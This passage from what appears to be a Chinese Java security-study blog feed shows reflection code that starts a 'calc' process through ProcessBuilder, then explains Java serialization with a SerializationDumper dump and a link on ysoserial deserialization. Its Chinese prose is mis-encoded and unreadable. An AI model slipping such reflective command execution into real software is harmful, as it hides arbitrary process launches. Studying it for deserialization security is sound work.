</span>&#123;<br><span class="hljs-comment">//        ProcessBuilder processBuilder = new ProcessBuilder(&quot;calc&quot;);</span><br><span class="hljs-comment">//        processBuilder.start();</span><br><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br><span class="hljs-comment">//        Constructor&lt;?&gt; constructor = aClass.getConstructor(List.class);</span><br><span class="hljs-comment">//        Object calc = constructor.newInstance(Arrays.asList(&quot;calc&quot;));</span><br><span class="hljs-comment">//        Method start = aClass.getMethod(&quot;start&quot;);</span><br><span class="hljs-comment">//        start.invoke(calc);</span><br><br><span class="hljs-comment">//        aClass.getMethod(&quot;start&quot;).invoke(aClass.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc&quot;)));</span><br>        <br>        <span class="hljs-comment">// åœ¨è°ƒç”¨ newInstance çš„æ—¶å€™ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°æœ¬èº«æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼Œæˆ‘ä»¬ä¼ ç»™</span><br>        <span class="hljs-comment">// ProcessBuilder çš„ä¹Ÿæ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼ŒäºŒè€…å åŠ ä¸ºä¸€ä¸ªäºŒç»´æ•°ç»„</span><br>        aClass.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(aClass.getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> String[][]&#123;&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;&#125;));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://www.bilibili.com/video/BV1fh411y7R8/?p=716&amp;spm_id_from=pageDriver&amp;vd_source=db93b94230228cb739b48f4f59e74abd">ã€é›¶åŸºç¡€ å¿«é€Ÿå­¦Javaã€‘éŸ©é¡ºå¹³ é›¶åŸºç¡€30å¤©å­¦ä¼šJava</a></li><li><a href="https://www.zhihu.com/question/38496907">hotpot javaè™šæ‹ŸæœºClasså¯¹è±¡æ˜¯æ”¾åœ¨ æ–¹æ³•åŒº è¿˜æ˜¯å †ä¸­ ï¼Ÿ</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</title>
    <link href="/2022/08/20/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/08/20/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h3 id="Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</h3><h4 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„æ„ä¹‰"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„æ„ä¹‰" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„æ„ä¹‰"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„æ„ä¹‰</h4><p>Javaå¯¹è±¡æœ‰æ—¶éœ€è¦è¿›è¡Œä¼ è¾“ã€æˆ–æŒä¹…åŒ–ï¼Œè€Œå¯¹è±¡åˆæ— æ³•ç›´æ¥è¿›è¡Œä¼ è¾“æˆ–ä¿å­˜ï¼Œå› æ­¤æœ‰äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><blockquote><p>åºåˆ—åŒ–ï¼šæŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ç§°ä¸ºå¯¹è±¡çš„åºåˆ—åŒ–ï¼Œå³å¯¹è±¡è½¬æ¢æˆä¸€ä¸²ç”±äºŒè¿›åˆ¶å­—èŠ‚ç»„æˆçš„æ•°ç»„ï¼Œç„¶åå°†è¿™äºŒè¿›åˆ¶æ•°æ®ä¿å­˜åœ¨ç£ç›˜æˆ– è¿›è¡Œç½‘ç»œä¼ è¾“ï¼›</p><p>ååºåˆ—åŒ–ï¼šæŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ç§°ä¸ºå¯¹è±¡çš„ååºåˆ—åŒ–ï¼Œå³æ¥ä»ç½‘ç»œæ¥æ”¶æˆ–ä»ç£ç›˜è¯»å–å­—èŠ‚åºåˆ—ï¼Œå¹¶é€šè¿‡ååºåˆ—åŒ–è¿˜åŸæˆä¸ºå¯¹è±¡ã€‚</p></blockquote><p><img src="/2022/08/20/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"></p><h5 id="ä¸»è¦åº”ç”¨åœºæ™¯"><a href="#ä¸»è¦åº”ç”¨åœºæ™¯" class="headerlink" title="ä¸»è¦åº”ç”¨åœºæ™¯"></a>ä¸»è¦åº”ç”¨åœºæ™¯</h5><ul><li>æƒ³æŠŠå†…å­˜ä¸­çš„å¯¹è±¡ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­æˆ–è€…æ•°æ®åº“ä¸­æ—¶å€™ï¼›</li><li>æƒ³ç”¨å¥—æ¥å­—åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„æ—¶å€™ï¼›</li><li>æƒ³é€šè¿‡RMIä¼ è¾“å¯¹è±¡çš„æ—¶å€™</li></ul><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªWxç±»ï¼Œéœ€å®ç°Serializableæ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Wx</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> String name = <span class="hljs-string">&quot;wx&quot;</span>;<br>    <span class="hljs-keyword">transient</span> Integer age = <span class="hljs-number">24</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Wx&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReadObjectTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ser();<br>        unSer();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Wx wx = <span class="hljs-keyword">new</span> Wx();<br>        FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;C:\\Users\\53433\\Desktop\\bin.ser&quot;</span>);<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>        oos.writeObject(wx);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">unSer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;C:\\Users\\53433\\Desktop\\bin.ser&quot;</span>);<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(fileInputStream);<br>        Object o = objectInputStream.readObject();<br>        System.out.println(o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆçš„<code>bin.ser</code>æ–‡ä»¶</p><p><img src="/2022/08/20/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"></p><p>è¿™ä¸ªçœ‹ä¸æ‡‚</p><p>ä½¿ç”¨å·¥å…·<a href="https://github.com/NickstaDB/SerializationDumper"><code>SerializationDumper.jar</code></a>å°†åºåˆ—åŒ–å­—ç¬¦ä¸²å˜æˆäººèƒ½çœ‹æ‡‚çš„</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs haxe">STREAM_MAGIC - <span class="hljs-number">0xac</span> ed<span class="hljs-comment">// åºåˆ—åŒ–åè®®(å¯¹è±¡åºåˆ—åŒ–çš„åè®®éƒ½æ˜¯aced)</span><br>STREAM_VERSION - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><span class="hljs-comment">// åºåˆ—åŒ–ç‰ˆæœ¬</span><br>Contents<br>  TC_OBJECT - <span class="hljs-number">0x73</span><span class="hljs-comment">// java.io.ObjectStreamConstantsæ¥å£ä¸­å®šä¹‰ æ ‡è®°åé¢çš„æ•°æ®ä¸ºObjectå¯¹è±¡</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><span class="hljs-comment">// ObjectStreamConstantsæ¥å£ä¸­å®šä¹‰,ç±»æè¿°ç¬¦æ ‡è¯†ï¼Œè¡¨ç¤ºä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰ä¿¡æ¯</span><br>      className<span class="hljs-comment">// ç±»å</span><br>        Length - <span class="hljs-number">18</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">12</span><br>        Value - com.mechoy.read.Wx - <span class="hljs-number">0x636f6d2e6d6563686f792e726561642e5778</span><br>      serialVersionUID - <span class="hljs-number">0x2d</span> e5 d9 de c3 bf <span class="hljs-number">3</span>f <span class="hljs-number">0</span>d<br>      <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">00</span><span class="hljs-comment">// å¥æŸ„æ ‡è¯†ç¬¦</span><br>      classDescFlags - <span class="hljs-number">0x02</span> - SC_SERIALIZABLE<span class="hljs-comment">// ObjectStreamClassæ ‡å¿—çš„ä½æ©ç ã€‚æŒ‡ç¤ºç±»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œ0x02è¡¨ç¤ºå¯¹è±¡å®ç°äº†Serializableæ¥å£ï¼Œ0x03è¡¨ç¤ºå®ç°æ¥å£çš„åŒæ—¶è¿˜å®ç°äº†readObject()</span><br>      fieldCount - <span class="hljs-number">2</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">02</span><span class="hljs-comment">// å­—æ®µæ•°</span><br>      Fields<br>        <span class="hljs-number">0</span>:<span class="hljs-type"></span><br>          Object - L - <span class="hljs-number">0x4c</span><br>          fieldName<span class="hljs-comment">// å­—æ®µå</span><br>            Length - <span class="hljs-number">3</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">03</span><br>            Value - age - <span class="hljs-number">0x616765</span><br>          className1<span class="hljs-comment">// å­—æ®µç±»å‹</span><br>            TC_STRING - <span class="hljs-number">0x74</span><br>              <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">01</span><br>              Length - <span class="hljs-number">19</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">13</span><br>              Value - Ljava/lang/Integer; - <span class="hljs-number">0x4c6a6176612f6c616e672f496e74656765723b</span><br>        <span class="hljs-number">1</span>:<span class="hljs-type"></span><br>          Object - L - <span class="hljs-number">0x4c</span><br>          fieldName<br>            Length - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>            Value - name - <span class="hljs-number">0x6e616d65</span><br>          className1<br>            TC_STRING - <span class="hljs-number">0x74</span><br>              <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">02</span><br>              Length - <span class="hljs-number">18</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">12</span><br>              Value - Ljava/lang/<span class="hljs-keyword">String</span>; - <span class="hljs-number">0x4c6a6176612f6c616e672f537472696e673b</span><br>      classAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><span class="hljs-comment">// å¯¹è±¡çš„å¯é€‰å—æ•°æ®å—ç»“æŸ</span><br>      superClassDesc<br>        TC_NULL - <span class="hljs-number">0x70</span><span class="hljs-comment">// ç©ºå¯¹è±¡å¼•ç”¨ï¼Œè¡¨ç¤ºæ²¡æœ‰ç»§æ‰¿çˆ¶ç±»æˆ–çˆ¶ç±»æ²¡æœ‰å®ç°Serializableæ¥å£</span><br>    <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">03</span><br>    classdata<span class="hljs-comment">// å¯¹è±¡æ•°æ®</span><br>      com.mechoy.read.Wx<br>        values<br>          age<br>            (object)<br>              TC_OBJECT - <span class="hljs-number">0x73</span><br>                TC_CLASSDESC - <span class="hljs-number">0x72</span><br>                  className<br>                    Length - <span class="hljs-number">17</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">11</span><br>                    Value - java.lang.Integer - <span class="hljs-number">0x6a6176612e6c616e672e496e7465676572</span><br>                  serialVersionUID - <span class="hljs-number">0x12</span> e2 a0 a4 f7 <span class="hljs-number">81</span> <span class="hljs-number">87</span> <span class="hljs-number">38</span><br>                  <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">04</span><br>                  classDescFlags - <span class="hljs-number">0x02</span> - SC_SERIALIZABLE<br>                  fieldCount - <span class="hljs-number">1</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">01</span><br>                  Fields<br>                    <span class="hljs-number">0</span>:<span class="hljs-type"></span><br>                      <span class="hljs-keyword">Int</span> - I - <span class="hljs-number">0x49</span><br>                      fieldName<br>                        Length - <span class="hljs-number">5</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br>                        Value - value - <span class="hljs-number">0x76616c7565</span><br>                  classAnnotations<br>                    TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>                  superClassDesc<br>                    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>                      className<br>                        Length - <span class="hljs-number">16</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">10</span><br>                        Value - java.lang.Number - <span class="hljs-number">0x6a6176612e6c616e672e4e756d626572</span><br>                      serialVersionUID - <span class="hljs-number">0x86</span> ac <span class="hljs-number">95</span> <span class="hljs-number">1</span>d <span class="hljs-number">0</span>b <span class="hljs-number">94</span> e0 <span class="hljs-number">8</span>b<br>                      <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">05</span><br>                      classDescFlags - <span class="hljs-number">0x02</span> - SC_SERIALIZABLE<br>                      fieldCount - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>                      classAnnotations<br>                        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>                      superClassDesc<br>                        TC_NULL - <span class="hljs-number">0x70</span><br>                <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">06</span><br>                classdata<br>                  java.lang.Number<br>                    values<br>                  java.lang.Integer<br>                    values<br>                      value<br>                        (int)<span class="hljs-number">13</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d<br>          name<br>            (object)<br>              TC_STRING - <span class="hljs-number">0x74</span><br>                <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">07</span><br>                Length - <span class="hljs-number">6</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">06</span><br>                Value - Mechoy - <span class="hljs-number">0x4d6563686f79</span><br><br></code></pre></td></tr></table></figure><p>ä»æ–‡ä»¶å¯ä»¥çœ‹å‡ºï¼š</p><ol><li>å®šä¹‰äº†åºåˆ—åŒ–çš„åè®®å’Œç‰ˆæœ¬</li><li>Classçš„æè¿°</li><li>å¯¹è±¡çš„æ•°æ®</li></ol><p>å…·ä½“çš„ä¸€äº›æè¿°è§<a href="https://xz.aliyun.com/t/8686#toc-5">SerializationDumperè¾…åŠ©ç ”ç©¶ysoserial URLDNSååºåˆ—åŒ–åŸç†</a>æˆ–è€…<code>ObjectStreamConstants</code>æ¥å£çš„å®˜æ–¹æ–‡æ¡£</p><h4 id="Serializable-æ¥å£"><a href="#Serializable-æ¥å£" class="headerlink" title="Serializable æ¥å£"></a>Serializable æ¥å£</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥æ¥å£åªæ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œç”¨äºæ ‡è¯†å½“å‰ç±»å¯ä»¥è¢« <code>ObjectOutputStream </code>åºåˆ—åŒ–ï¼Œä»¥åŠè¢« <code>ObjectInputStream </code>ååºåˆ—åŒ–ã€‚</p><p>ä»»ä½•æƒ³è¦è¿›è¡Œåºåˆ—åŒ–çš„ç±»éƒ½<strong>å¿…é¡»ç›´æ¥æˆ–é—´æ¥å®ç°è¯¥æ¥å£</strong>ã€‚</p><h5 id="æ¥å£ç‰¹ç‚¹ï¼š"><a href="#æ¥å£ç‰¹ç‚¹ï¼š" class="headerlink" title="æ¥å£ç‰¹ç‚¹ï¼š"></a>æ¥å£ç‰¹ç‚¹ï¼š</h5><ol><li><p>ç›®æ ‡ç±»çš„å±æ€§æ²¡æœ‰å®ç° Serializableæ¥å£æ—¶ï¼Œåœ¨è¿›è¡Œåºåˆ—åŒ–æ—¶å°±ä¼šæŠ¥é”™</p><p>è¿™ä¸ªä¸»è¦æ˜¯é’ˆå¯¹éåŸºæœ¬æ•°æ®ç±»å‹çš„å±æ€§ï¼Œå› ä¸ºåŸºæœ¬æ•°æ®ç±»å‹åŸºæœ¬éƒ½å·²ç»å®ç°<code>Serializable</code>æ¥å£</p><p><img src="/3.png"></p><p>ä¸¾ä¸ªä¾‹å­ï¼šå½“æœ‰ä¸ª<code>Student</code>ç±»å‹çš„å±æ€§æ—¶ï¼Œå¹¶ä¸”<code>Student</code>ç±»åˆæ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼Œæ­¤æ—¶ä¼šæŠ¥å‡ºå¦‚ä¸‹é”™è¯¯</p><p><img src="/4.png"></p></li><li><p>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå®ƒçš„çˆ¶ç±»å¦‚æœæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆå°†éœ€è¦æä¾›æ— å‚æ„é€ å‡½æ•°æ¥é‡æ–°åˆ›å»ºå¯¹è±¡ã€‚</p><p><img src="/5.png"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸‹ï¼Œåœ¨æ²¡æœ‰ä»»ä½•æ„é€ å™¨çš„æ—¶å€™ï¼Œä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„æ— å‚æ„é€ å™¨ï¼Œæ‰€ä»¥éœ€è¦ç»™ä¸€ä¸ªæœ‰å‚æ„é€ </p><p>ç»™å‡ºæ— å‚æ„é€ å™¨ä¹‹å</p><p><img src="/6.png"></p></li><li><p>å®ç° Serializable æ¥å£çš„å­ç±»ä¹Ÿæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ï¼Œæˆ–è€…å®ç°Serializable æ¥å£çš„å­æ¥å£åŒæ ·å¯ä»¥è¢«åºåˆ—åŒ–(ä¾‹å¦‚<code>Externalizable</code>)</p><p><img src="/7.png"></p></li><li><p>é™æ€æˆå‘˜å˜é‡æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–ï¼ŒåŸå› åœ¨äºåºåˆ—åŒ–æ˜¯é’ˆå¯¹å¯¹è±¡å±æ€§çš„ï¼Œè€Œé™æ€æˆå‘˜å˜é‡æ˜¯å±äºç±»çš„ï¼Œåœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¸ä¼šå¯¹é™æ€æˆå‘˜å˜é‡è¿›è¡Œåºåˆ—åŒ–ï¼Œè¿™é‡Œçš„ä¸èƒ½åºåˆ—åŒ–çš„æ„æ€ï¼Œæ˜¯åºåˆ—åŒ–ä¿¡æ¯ä¸­ä¸åŒ…å«è¿™ä¸ªé™æ€æˆå‘˜åŸŸï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå¾—åˆ°çš„æ˜¯<strong>è¯¥é™æ€å±æ€§çš„é»˜è®¤å€¼</strong>ï¼Œè€Œéåé¢èµ‹äºˆçš„</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šæœ¬åœ°æµ‹è¯•æ—¶ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸åº”åœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´ï¼Œååºåˆ—åŒ–å¤„çš„<code>static</code>é™æ€å±æ€§æ˜¯åé¢èµ‹å€¼çš„ï¼Œè€Œéä»–åŸæœ¬çš„é»˜è®¤å€¼</p><p><img src="/2022/08/20/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"></p><p>åŒä¸€è¿›ç¨‹æ—¶ï¼Œ<code>static</code>ä¿®é¥°çš„å±æ€§ååºåˆ—åŒ–çš„ç»“æœä¸æ˜¯é™æ€å€¼</p><p><img src="/2022/08/20/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png"></p></li><li><p><code>transient</code>ä¿®é¥°çš„å±æ€§ï¼Œä¹Ÿä¸ä¼šè¢«åºåˆ—åŒ–</p><p><img src="/2022/08/20/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png"></p></li></ol><h4 id="Externalizable-æ¥å£"><a href="#Externalizable-æ¥å£" class="headerlink" title="Externalizable æ¥å£"></a>Externalizable æ¥å£</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Externalizable</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">writeExternal</span><span class="hljs-params">(ObjectOutput out)</span> <span class="hljs-keyword">throws</span> IOException</span>;<br><span class="hljs-comment">// è¯¥å¯¹è±¡å®ç°äº†readExternalæ–¹æ³•æ¥æ¢å¤å…¶å†…å®¹ï¼Œæ–¹æ³•æ˜¯ä¸ºå¯¹è±¡ï¼Œå­—ç¬¦ä¸²å’Œæ•°ç»„è°ƒç”¨åŸºæœ¬ç±»å‹çš„DataInputæ–¹æ³•å’ŒreadObjectã€‚</span><br>    <span class="hljs-comment">// è‡ªå®šä¹‰çš„readObject()</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">readExternal</span><span class="hljs-params">(ObjectInput in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException</span>;<br>    <span class="hljs-comment">// è¯¥å¯¹è±¡å®ç°äº†writeExternalæ–¹æ³•æ¥é€šè¿‡è°ƒç”¨DataOutputçš„åŸå§‹å€¼æˆ–è°ƒç”¨ObjectOutputçš„å¯¹è±¡ï¼Œå­—ç¬¦ä¸²å’Œæ•°ç»„çš„writeObjectæ–¹æ³•æ¥ä¿å­˜å…¶å†…å®¹ã€‚</span><br>    <span class="hljs-comment">// è‡ªå®šä¹‰çš„writeObject()</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Externalizable </code>æ¥å£ç®€å•ç‚¹è¯´ï¼šä¸º<code>Serializable</code>æ¥å£æä¾›äº†æ‰©å±•ï¼Œä¸ºç”¨æˆ·æä¾›äº†æ‰©å±•è‡ªå®šä¹‰åºåˆ—åŒ–çš„è¿‡ç¨‹</p><p>æ³¨æ„ï¼šæœ¬åœ°æµ‹è¯•ç‰ˆæœ¬<code>jdk 1.8.0_341</code></p><p><img src="/2022/08/20/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png"></p><h4 id="ObjectInputStreamå’ŒObjectOutputStream"><a href="#ObjectInputStreamå’ŒObjectOutputStream" class="headerlink" title="ObjectInputStreamå’ŒObjectOutputStream"></a>ObjectInputStreamå’ŒObjectOutputStream</h4><ul><li><p><code>ObjectInputStream</code> 